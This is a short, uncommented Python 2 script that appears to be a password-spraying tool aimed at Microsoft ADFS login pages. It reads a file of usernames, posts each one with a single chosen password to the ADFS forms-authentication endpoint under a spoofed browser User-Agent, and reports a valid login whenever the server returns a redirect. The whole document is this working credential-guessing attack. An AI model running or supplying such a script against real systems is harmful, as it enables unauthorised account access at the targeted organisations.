import urllib2
import urllib
import sys


def send_request(url, username, password):
        print "Trying username %s" % username

        request = urllib2.Request("%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=%s&wctx=cbcxt=&username=%s&mkt=&lc=" % (url, urllib.quote("urn:federation:MicrosoftOnline"), urllib.quote(username)))
        request.add_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0")
        request.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        try:
                response = urllib2.urlopen(request, "UserName=%s&Password=%s&AuthMethod=FormsAuthentication" % (urllib.quote(username), urllib.quote(password)))
                if response.code == 302:
                        print "%s password is %s" % (username, password)
                print response.read()
        except:
                pass

if __name__ == "__main__":

        if len(sys.argv) < 3:
                print "Usage %s url username-list password" % sys.argv[0]
                exit(0)

        for username in open(sys.argv[2], "rb").readlines():
                send_request(sys.argv[1], username, sys.argv[3])
